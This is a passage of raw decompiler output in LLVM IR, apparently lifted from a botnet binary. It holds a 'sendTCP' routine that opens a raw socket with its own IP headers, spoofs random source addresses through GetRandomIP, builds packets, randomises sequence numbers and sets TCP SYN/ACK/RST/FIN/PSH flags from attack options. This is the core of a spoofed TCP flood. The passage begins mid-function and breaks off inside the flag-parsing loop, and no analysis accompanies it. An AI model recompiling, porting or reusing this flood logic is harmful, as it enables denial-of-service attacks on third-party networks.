dec_label_pc_804bc40:                             ; preds = %dec_label_pc_804bbf3, %dec_label_pc_804b954, %dec_label_pc_804b925
  %v0_804bc4929 = phi i32 [ %v5_804b980, %dec_label_pc_804b954 ], [ %v3_804b941, %dec_label_pc_804b925 ], [ %v3_804bbfa, %dec_label_pc_804bbf3 ]
  br label %dec_label_pc_804bc43

dec_label_pc_804bc43:                             ; preds = %dec_label_pc_804b8d7, %dec_label_pc_804b82e, %dec_label_pc_804b805, %dec_label_pc_804b7c5, %dec_label_pc_804bc40
  %v0_804bc49 = phi i32 [ 0, %dec_label_pc_804b82e ], [ 0, %dec_label_pc_804b805 ], [ %v3_804b7d5, %dec_label_pc_804b7c5 ], [ %v0_804bc4929, %dec_label_pc_804bc40 ], [ %v2_804b8de, %dec_label_pc_804b8d7 ]
  store i32 %v0_804b792, i32* @ebx, align 4
  ret i32 %v0_804bc49

; uselistorder directives
  uselistorder i32 %v4_804bc10, { 2, 1, 0 }
  uselistorder i32 %v4_804bbdc, { 1, 0 }
  uselistorder i32 %v2_804bb9f, { 1, 0 }
  uselistorder i32 %v4_804bb98, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804bb60, { 1, 0 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v5_804baff, { 1, 0 }
  uselistorder i32 %v4_804bac7, { 2, 1, 0 }
  uselistorder i32 %v1_804bb84.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804bab3, { 2, 1, 0 }
  uselistorder i32 %v2_804ba8f, { 1, 0 }
  uselistorder i32 %v3_804ba80, { 1, 0 }
  uselistorder i32 %v1_804ba7a, { 1, 0 }
  uselistorder i32 %v2_804ba16, { 10, 9, 8, 18, 17, 16, 7, 6, 15, 5, 14, 13, 12, 11, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804b9e8, { 1, 0 }
  uselistorder i32 %v3_804b941, { 0, 2, 1, 5, 4, 3, 6, 7 }
  uselistorder i32 %v4_804b8f5, { 1, 0 }
  uselistorder i32 %stack_var_-92.0, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v1_804b835, { 1, 3, 2, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_804b831, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_804b81c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804b7c5, { 1, 0 }
  uselistorder i32 %v1_804b7b3, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 2, 3, 0, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 10, 7, 8, 9, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 38, 36, 37, 40, 39, 43, 41, 42, 46, 44, 45, 48, 47, 49, 50, 52, 51, 53 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bc43, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804bb95, { 1, 0 }
  uselistorder label %dec_label_pc_804bb30, { 1, 0 }
  uselistorder label %dec_label_pc_804bb30.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bac4, { 1, 0 }
  uselistorder label %dec_label_pc_804b9ef, { 1, 0 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_804b997, { 1, 0 }
  uselistorder label %dec_label_pc_804b8d7, { 1, 0 }
  uselistorder label %dec_label_pc_804b88d, { 1, 0 }
  uselistorder label %dec_label_pc_804b88d.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b7c5, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp38 = call i16 @__decompiler_undefined_function_5()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp40 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804bc4e = load i32, i32* @esi, align 4
  %v0_804bc4f = load i32, i32* @ebx, align 4
  %v15_804bc50 = ptrtoint i32* %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bc67 = icmp eq i32 %arg2, 0
  %v1_804bc6b = icmp eq i1 %v4_804bc67, false
  br i1 %v1_804bc6b, label %dec_label_pc_804bc7b, label %dec_label_pc_804bc6d

dec_label_pc_804bc6d:                             ; preds = %entry
  %v1_804bc6d = call i32 @rand_cmwc(i32 %v15_804bc50)
  br label %dec_label_pc_804bc90

dec_label_pc_804bc7b:                             ; preds = %entry
  %v1_804bc7e = urem i32 %arg2, 65536
  store i32 %v1_804bc7e, i32* %eax.global-to-local, align 4
  store i32 %v1_804bc7e, i32* %stack_var_-188, align 4
  %v1_804bc84 = trunc i32 %arg2 to i16
  %v2_804bc84 = call i32 @htons(i16 %v1_804bc84)
  br label %dec_label_pc_804bc90

dec_label_pc_804bc90:                             ; preds = %dec_label_pc_804bc6d, %dec_label_pc_804bc7b
  %v2_804bc90 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804bc93 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804bc93, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-188, align 4
  %v3_804bca0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804bca0, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bca5 = icmp eq i32 %v3_804bca0, 0
  br i1 %v1_804bca5, label %dec_label_pc_804bcae, label %dec_label_pc_804c1be

dec_label_pc_804bcae:                             ; preds = %dec_label_pc_804bc90
  %v5_804bcb1 = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
  store i1 %v5_804bcb1, i1* %cf.global-to-local, align 1
  %v15_804bcb1 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804bcb1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v3_804bcd8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_804bcd8, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bce0 = icmp eq i32 %v3_804bcd8, 0
  %v1_804bce4 = icmp eq i1 %v4_804bce0, false
  br i1 %v1_804bce4, label %dec_label_pc_804bceb, label %dec_label_pc_804c1be

dec_label_pc_804bceb:                             ; preds = %dec_label_pc_804bcae
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804bcfa = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v3_804bcd8, i32* %eax.global-to-local, align 4
  store i32 %v3_804bcd8, i32* %stack_var_-188, align 4
  %v5_804bd17 = call i32 @__GI_setsockopt(i32 %v3_804bcd8, i32 0, i32 3, i32 %v2_804bcfa, i32 4)
  store i32 %v5_804bd17, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804bd1c = icmp slt i32 %v5_804bd17, 0
  %v1_804bd1e = icmp eq i1 %v2_804bd1c, false
  br i1 %v1_804bd1e, label %dec_label_pc_804bd25, label %dec_label_pc_804c1be

dec_label_pc_804bd25:                             ; preds = %dec_label_pc_804bceb
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bd25 = icmp eq i32 %arg4, 0
  %v1_804bd29 = icmp eq i1 %v4_804bd25, false
  br i1 %v1_804bd29, label %dec_label_pc_804bd34, label %dec_label_pc_804bd4a

dec_label_pc_804bd34:                             ; preds = %dec_label_pc_804bd25
  %v5_804bd3b = sub i32 32, %arg4
  %v10_804bd3b = icmp ugt i32 %arg4, 32
  store i1 %v10_804bd3b, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804bd43 = urem i32 %v5_804bd3b, 32
  %v4_804bd43 = icmp eq i32 %v2_804bd43, 0
  br i1 %v4_804bd43, label %bb89, label %bb

bb:                                               ; preds = %dec_label_pc_804bd34
  %v5_804bd43 = shl i32 1, %v2_804bd43
  store i32 %v5_804bd43, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_804bd34, %bb
  %v0_804bd45 = phi i32 [ 1, %dec_label_pc_804bd34 ], [ %v5_804bd43, %bb ]
  %v1_804bd45 = sub i32 0, %v0_804bd45
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804bd45, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd4a

dec_label_pc_804bd4a:                             ; preds = %dec_label_pc_804bd25, %bb89
  %storemerge10 = phi i32 [ %v1_804bd45, %bb89 ], [ 0, %dec_label_pc_804bd25 ]
  %v1_804bd4d = add i32 %arg6, 40
  %v1_804bd59 = add i32 %arg6, 70
  %v2_804bd5c = and i32 %v1_804bd59, -16
  %v0_804bd62 = load i32, i32* @esp, align 4
  %v2_804bd62 = sub i32 %v0_804bd62, %v2_804bd5c
  %v1_804bd64 = add i32 %v2_804bd62, 24
  store i32 %v1_804bd64, i32* %edx.global-to-local, align 4
  %v1_804bd6e = add i32 %v2_804bd62, 39
  %v2_804bd71 = and i32 %v1_804bd6e, -16
  %v1_804bd89 = add i32 %v2_804bd71, 20
  %v5_804bd8c = inttoptr i32 %v1_804bd89 to i16*
  %v1_804bd92 = add i32 %arg6, 20
  %v5_804bd92 = icmp ugt i32 %arg6, -21
  store i1 %v5_804bd92, i1* %cf.global-to-local, align 1
  store i32 %v1_804bd92, i32* @ebx, align 4
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_804bd9a = inttoptr i32 %v2_804bd62 to i32*
  store i32 %storemerge10, i32* %v2_804bd9a, align 4
  %v2_804bd9d = call i32 @GetRandomIP(i32 %v1_804bd4d, i32 %v2_804bd71)
  store i32 %v2_804bd9d, i32* %eax.global-to-local, align 4
  %v1_804bda2 = load i32, i32* @esp, align 4
  %v2_804bda2 = inttoptr i32 %v1_804bda2 to i32*
  store i32 %v2_804bd9d, i32* %v2_804bda2, align 4
  %v0_804bda5 = call i32 @htonl()
  %v3_804bdaa = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804bdaa, i32* %edx.global-to-local, align 4
  %v0_804bdad = load i32, i32* @ebx, align 4
  %v1_804bdad = load i32, i32* @esp, align 4
  %v2_804bdad = add i32 %v1_804bdad, 16
  %v3_804bdad = inttoptr i32 %v2_804bdad to i32*
  store i32 %v0_804bdad, i32* %v3_804bdad, align 4
  %v0_804bdb1 = load i32, i32* @esp, align 4
  %v1_804bdb1 = add i32 %v0_804bdb1, 12
  %v2_804bdb1 = inttoptr i32 %v1_804bdb1 to i32*
  store i32 6, i32* %v2_804bdb1, align 4
  %v1_804bdb9 = load i32, i32* @esp, align 4
  %v2_804bdb9 = add i32 %v1_804bdb9, 8
  %v3_804bdb9 = inttoptr i32 %v2_804bdb9 to i32*
  store i32 %v0_804bda5, i32* %v3_804bdb9, align 4
  %v0_804bdbd = load i32, i32* %edx.global-to-local, align 4
  %v1_804bdbd = load i32, i32* @esp, align 4
  %v2_804bdbd = add i32 %v1_804bdbd, 4
  %v3_804bdbd = inttoptr i32 %v2_804bdbd to i32*
  store i32 %v0_804bdbd, i32* %v3_804bdbd, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v1_804bdc4 = load i32, i32* @esp, align 4
  %v2_804bdc4 = inttoptr i32 %v1_804bdc4 to i32*
  store i32 %v2_804bd71, i32* %v2_804bdc4, align 4
  %v0_804bdc7 = call i32 @makeIPPacket()
  store i32 %v0_804bdc7, i32* %eax.global-to-local, align 4
  %v2_804bdcc = call i32 @rand_cmwc(i32 %v1_804bd89)
  %v1_804bdd1 = urem i32 %v2_804bdcc, 65536
  store i32 %v1_804bdd1, i32* %edx.global-to-local, align 4
  store i32 %v1_804bd89, i32* %eax.global-to-local, align 4
  %v1_804bdd7 = trunc i32 %v2_804bdcc to i16
  store i16 %v1_804bdd7, i16* %v5_804bd8c, align 4
  %v2_804bdda = call i32 @rand_cmwc(i32 %v1_804bd89)
  %v2_804bde4 = add i32 %v2_804bd71, 24
  %v3_804bde4 = inttoptr i32 %v2_804bde4 to i32*
  store i32 %v2_804bdda, i32* %v3_804bde4, align 8
  store i32 %v1_804bd89, i32* %eax.global-to-local, align 4
  %v1_804bdea = add i32 %v2_804bd71, 28
  %v2_804bdea = inttoptr i32 %v1_804bdea to i32*
  store i32 0, i32* %v2_804bdea, align 4
  store i32 %v1_804bd89, i32* %edx.global-to-local, align 4
  %v1_804bdf4 = add i32 %v2_804bd71, 32
  %v2_804bdf4 = inttoptr i32 %v1_804bdf4 to i8*
  %v3_804bdf4 = load i8, i8* %v2_804bdf4, align 16
  %v2_804bdf8 = urem i8 %v3_804bdf4, 16
  %v2_804bdfa = or i8 %v2_804bdf8, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804bdfa, i8* %v2_804bdf4, align 16
  %v4_804bdff = ptrtoint i8* %arg5 to i32
  store i32 %v4_804bdff, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804bdff, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055ff0.101 to i32), i32* @edi, align 4
  %v7_804be1d = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055ff0.101, i32 0, i32 0), i32 4)
  %v8_804be1d = urem i32 %v7_804be1d, 2
  %v9_804be1d = icmp eq i32 %v8_804be1d, 0
  %v0_804be1f = load i1, i1* %cf.global-to-local, align 1
  %v2_804be1f = or i1 %v0_804be1f, %v9_804be1d
  %v3_804be1f = zext i1 %v2_804be1f to i32
  %v4_804be1f = load i32, i32* %edx.global-to-local, align 4
  %v5_804be1f = and i32 %v4_804be1f, -256
  %v6_804be1f = or i32 %v3_804be1f, %v5_804be1f
  %v7_804be1f = xor i32 %v6_804be1f, 1
  store i32 %v7_804be1f, i32* @edx, align 4
  %v3_804be25 = and i32 %v7_804be1d, -256
  %v1_804be27 = trunc i32 %v7_804be1f to i8
  %v3_804be27 = zext i1 %v0_804be1f to i8
  %v4_804be27 = sub nsw i8 %v1_804be27, %v3_804be27
  %v15_804be27 = icmp eq i8 %v4_804be27, 0
  %v20_804be27 = zext i8 %v4_804be27 to i32
  %v23_804be27 = or i32 %v20_804be27, %v3_804be25
  store i32 %v23_804be27, i32* @ecx, align 4
  %v2_804be2b = sext i8 %v4_804be27 to i32
  store i32 %v2_804be2b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be30 = icmp eq i1 %v15_804be27, false
  br i1 %v1_804be30, label %dec_label_pc_804be73, label %dec_label_pc_804be32

dec_label_pc_804be32:                             ; preds = %dec_label_pc_804bd4a
  store i32 %v1_804bd89, i32* %edx.global-to-local, align 4
  %v1_804be35 = add i32 %v2_804bd71, 33
  %v2_804be35 = inttoptr i32 %v1_804be35 to i8*
  %v3_804be35 = load i8, i8* %v2_804be35, align 1
  %v2_804be39 = or i8 %v3_804be35, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be39 = zext i8 %v2_804be39 to i32
  store i32 %v7_804be39, i32* %eax.global-to-local, align 4
  store i8 %v2_804be39, i8* %v2_804be35, align 1
  store i32 %v1_804bd89, i32* %edx.global-to-local, align 4
  %v3_804be41 = load i8, i8* %v2_804be35, align 1
  %v2_804be45 = or i8 %v3_804be41, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be45 = zext i8 %v2_804be45 to i32
  store i32 %v7_804be45, i32* %eax.global-to-local, align 4
  store i8 %v2_804be45, i8* %v2_804be35, align 1
  store i32 %v1_804bd89, i32* %edx.global-to-local, align 4
  %v3_804be4d = load i8, i8* %v2_804be35, align 1
  %v2_804be51 = or i8 %v3_804be4d, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be51 = zext i8 %v2_804be51 to i32
  store i32 %v7_804be51, i32* %eax.global-to-local, align 4
  store i8 %v2_804be51, i8* %v2_804be35, align 1
  store i32 %v1_804bd89, i32* %edx.global-to-local, align 4
  %v3_804be59 = load i8, i8* %v2_804be35, align 1
  %v2_804be5d = or i8 %v3_804be59, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be5d = zext i8 %v2_804be5d to i32
  store i32 %v7_804be5d, i32* %eax.global-to-local, align 4
  store i8 %v2_804be5d, i8* %v2_804be35, align 1
  store i32 %v1_804bd89, i32* %edx.global-to-local, align 4
  %v3_804be65 = load i8, i8* %v2_804be35, align 1
  %v2_804be69 = or i8 %v3_804be65, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be69 = zext i8 %v2_804be69 to i32
  store i32 %v7_804be69, i32* %eax.global-to-local, align 4
  store i8 %v2_804be69, i8* %v2_804be35, align 1
  %v0_804c02a.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804c02a

dec_label_pc_804be73:                             ; preds = %dec_label_pc_804bd4a
  store i32 %v4_804bdff, i32* @eax, align 4
  %v0_804be76 = load i32, i32* @esp, align 4
  %v1_804be76 = add i32 %v0_804be76, 4
  %v2_804be76 = inttoptr i32 %v1_804be76 to i32*
  store i32 ptrtoint (i32* @global_var_8055ff4.102 to i32), i32* %v2_804be76, align 4
  %v0_804be7e = load i32, i32* @eax, align 4
  %v1_804be7e = load i32, i32* @esp, align 4
  %v2_804be7e = inttoptr i32 %v1_804be7e to i32*
  store i32 %v0_804be7e, i32* %v2_804be7e, align 4
  %v3_804be81 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8055ff0.101 to i32))
  store i32 %v3_804be81, i32* %eax.global-to-local, align 4
  %v5_804be86 = inttoptr i32 %v3_804be81 to i8*
  store i8* %v5_804be86, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c02017 = icmp eq i32 %v3_804be81, 0
  %v1_804c02424 = icmp eq i1 %v5_804c02017, false
  br i1 %v1_804c02424, label %dec_label_pc_804be8e.lr.ph, label %dec_label_pc_804c02a

dec_label_pc_804be8e.lr.ph:                       ; preds = %dec_label_pc_804be73
  %v1_804bfff = add i32 %v2_804bd71, 33
  %v2_804bfff = inttoptr i32 %v1_804bfff to i8*
  %tmp90 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804be8e

dec_label_pc_804be8e:                             ; preds = %dec_label_pc_804be8e.lr.ph, %dec_label_pc_804c009
  %v3_804bfb7 = phi i8* [ %v5_804be86, %dec_label_pc_804be8e.lr.ph ], [ %tmp91, %dec_label_pc_804c009 ]
  %stack_var_-160.126 = phi i32 [ %tmp39, %dec_label_pc_804be8e.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804c009 ]
  %stack_var_-156.125 = phi i8* [ %tmp40, %dec_label_pc_804be8e.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804c009 ]
  %v4_804be8e = ptrtoint i8* %v3_804bfb7 to i32
  store i32 %v4_804be8e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055ff6.103 to i32), i32* @edi, align 4
  %v7_804beac = call i32 @_strncmp(i8* %v3_804bfb7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055ff6.103, i32 0, i32 0), i32 4)
  %v8_804beac = urem i32 %v7_804beac, 2
  %v9_804beac = icmp eq i32 %v8_804beac, 0
  %v0_804beae = load i1, i1* %cf.global-to-local, align 1
  %v2_804beae = or i1 %v0_804beae, %v9_804beac
  %v3_804beae = zext i1 %v2_804beae to i32
  %v4_804beae = load i32, i32* @edx, align 4
  %v5_804beae = and i32 %v4_804beae, -256
  %v6_804beae = or i32 %v3_804beae, %v5_804beae
  %v7_804beae = xor i32 %v6_804beae, 1
  store i32 %v7_804beae, i32* %edx.global-to-local, align 4
  %v3_804beb4 = and i32 %v7_804beac, -256
  %v1_804beb6 = trunc i32 %v7_804beae to i8
  %v3_804beb6 = zext i1 %v0_804beae to i8
  %v4_804beb6 = sub nsw i8 %v1_804beb6, %v3_804beb6
  %v15_804beb6 = icmp eq i8 %v4_804beb6, 0
  %v20_804beb6 = zext i8 %v4_804beb6 to i32
  %v23_804beb6 = or i32 %v20_804beb6, %v3_804beb4
  store i32 %v23_804beb6, i32* @ecx, align 4
  %v2_804beba = sext i8 %v4_804beb6 to i32
  store i32 %v2_804beba, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bebf = icmp eq i1 %v15_804beb6, false
  br i1 %v1_804bebf, label %dec_label_pc_804bed3, label %dec_label_pc_804bec1

dec_label_pc_804bec1:                             ; preds = %dec_label_pc_804be8e
  store i32 %v1_804bd89, i32* @eax, align 4
  %v3_804bec4 = load i8, i8* %v2_804bfff, align 1
  %v2_804bec8 = or i8 %v3_804bec4, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bec8 = zext i8 %v2_804bec8 to i32
  store i32 %v7_804bec8, i32* @edx, align 4
  store i8 %v2_804bec8, i8* %v2_804bfff, align 1
  br label %dec_label_pc_804c009

dec_label_pc_804bed3:                             ; preds = %dec_label_pc_804be8e
  store i32 %v4_804be8e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055ffa.104 to i32), i32* @edi, align 4
  %v7_804bef1 = call i32 @_strncmp(i8* %v3_804bfb7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055ffa.104, i32 0, i32 0), i32 4)
  %v8_804bef1 = urem i32 %v7_804bef1, 2
  %v9_804bef1 = icmp eq i32 %v8_804bef1, 0
  %v0_804bef3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bef3 = or i1 %v0_804bef3, %v9_804bef1
  %v3_804bef3 = zext i1 %v2_804bef3 to i32
  %v4_804bef3 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bef3 = and i32 %v4_804bef3, -256
  %v6_804bef3 = or i32 %v3_804bef3, %v5_804bef3
  %v7_804bef3 = xor i32 %v6_804bef3, 1
  store i32 %v7_804bef3, i32* %edx.global-to-local, align 4
  %v3_804bef9 = and i32 %v7_804bef1, -256
  %v1_804befb = trunc i32 %v7_804bef3 to i8
  %v3_804befb = zext i1 %v0_804bef3 to i8
  %v4_804befb = sub nsw i8 %v1_804befb, %v3_804befb
  %v15_804befb = icmp eq i8 %v4_804befb, 0
  %v20_804befb = zext i8 %v4_804befb to i32
  %v23_804befb = or i32 %v20_804befb, %v3_804bef9
  store i32 %v23_804befb, i32* @ecx, align 4
  %v2_804beff = sext i8 %v4_804befb to i32
  store i32 %v2_804beff, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf04 = icmp eq i1 %v15_804befb, false
  br i1 %v1_804bf04, label %dec_label_pc_804bf18, label %dec_label_pc_804bf06

dec_label_pc_804bf06:                             ; preds = %dec_label_pc_804bed3
  store i32 %v1_804bd89, i32* @eax, align 4
  %v3_804bf09 = load i8, i8* %v2_804bfff, align 1
  %v2_804bf0d = or i8 %v3_804bf09, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf0d = zext i8 %v2_804bf0d to i32
  store i32 %v7_804bf0d, i32* @edx, align 4
  store i8 %v2_804bf0d, i8* %v2_804bfff, align 1
  br label %dec_label_pc_804c009

dec_label_pc_804bf18:                             ; preds = %dec_label_pc_804bed3
  store i32 %v4_804be8e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055ffe.105 to i32), i32* @edi, align 4
  %v7_804bf3c = call i32 @_strncmp(i8* %v3_804bfb7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055ffe.105, i32 0, i32 0), i32 4)
  %v8_804bf3c = urem i32 %v7_804bf3c, 2
  %v9_804bf3c = icmp eq i32 %v8_804bf3c, 0
  %v0_804bf3e = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf3e = or i1 %v0_804bf3e, %v9_804bf3c
  %v3_804bf3e = zext i1 %v2_804bf3e to i32
  %v4_804bf3e = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf3e = and i32 %v4_804bf3e, -256
  %v6_804bf3e = or i32 %v3_804bf3e, %v5_804bf3e
  %v7_804bf3e = xor i32 %v6_804bf3e, 1
  store i32 %v7_804bf3e, i32* %edx.global-to-local, align 4
  %v3_804bf44 = and i32 %v7_804bf3c, -256
  %v1_804bf46 = trunc i32 %v7_804bf3e to i8
  %v3_804bf46 = zext i1 %v0_804bf3e to i8
  %v4_804bf46 = sub nsw i8 %v1_804bf46, %v3_804bf46
  %v15_804bf46 = icmp eq i8 %v4_804bf46, 0
  %v20_804bf46 = zext i8 %v4_804bf46 to i32
  %v23_804bf46 = or i32 %v20_804bf46, %v3_804bf44
  store i32 %v23_804bf46, i32* @ecx, align 4
  %v2_804bf4a = sext i8 %v4_804bf46 to i32
  store i32 %v2_804bf4a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf4f = icmp eq i1 %v15_804bf46, false
  br i1 %v1_804bf4f, label %dec_label_pc_804bf63, label %dec_label_pc_804bf51

dec_label_pc_804bf51:                             ; preds = %dec_label_pc_804bf18
  store i32 %v1_804bd89, i32* @eax, align 4
  %v3_804bf54 = load i8, i8* %v2_804bfff, align 1
  %v2_804bf58 = or i8 %v3_804bf54, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf58 = zext i8 %v2_804bf58 to i32
  store i32 %v7_804bf58, i32* @edx, align 4
  store i8 %v2_804bf58, i8* %v2_804bfff, align 1
  br label %dec_label_pc_804c009

dec_label_pc_804bf63:                             ; preds = %dec_label_pc_804bf18
  store i32 %v4_804be8e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056002.106 to i32), i32* @edi, align 4
  %v7_804bf93 = call i32 @_strncmp(i8* %v3_804bfb7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056002.106, i32 0, i32 0), i32 4)
  %v8_804bf93 = urem i32 %v7_804bf93, 2
  %v9_804bf93 = icmp eq i32 %v8_804bf93, 0
  %v0_804bf95 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf95 = or i1 %v0_804bf95, %v9_804bf93
  %v3_804bf95 = zext i1 %v2_804bf95 to i32
  %v4_804bf95 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf95 = and i32 %v4_804bf95, -256
  %v6_804bf95 = or i32 %v3_804bf95, %v5_804bf95
  %v7_804bf95 = xor i32 %v6_804bf95, 1
  store i32 %v7_804bf95, i32* %edx.global-to-local, align 4
  %v3_804bf9b = and i32 %v7_804bf93, -256
  %v1_804bf9d = trunc i32 %v7_804bf95 to i8
  %v3_804bf9d = zext i1 %v0_804bf95 to i8
  %v4_804bf9d = sub nsw i8 %v1_804bf9d, %v3_804bf9d
  %v15_804bf9d = icmp eq i8 %v4_804bf9d, 0
  %v20_804bf9d = zext i8 %v4_804bf9d to i32
  %v23_804bf9d = or i32 %v20_804bf9d, %v3_804bf9b
  store i32 %v23_804bf9d, i32* @ecx, align 4
  %v2_804bfa1 = sext i8 %v4_804bf9d to i32
  store i32 %v2_804bfa1, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bfa6 = icmp eq i1 %v15_804bf9d, false
  br i1 %v1_804bfa6, label %dec_label_pc_804bfb7, label %dec_label_pc_804bfa8

dec_label_pc_804bfa8:                             ; preds = %dec_label_pc_804bf63
  store i32 %v1_804bd89, i32* @eax, align 4
  %v3_804bfab = load i8, i8* %v2_804bfff, align 1
  %v2_804bfaf = or i8 %v3_804bfab, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bfaf = zext i8 %v2_804bfaf to i32
  store i32 %v7_804bfaf, i32* @edx, align 4
  store i8 %v2_804bfaf, i8* %v2_804bfff, align 1
  br label %dec_label_pc_804c009

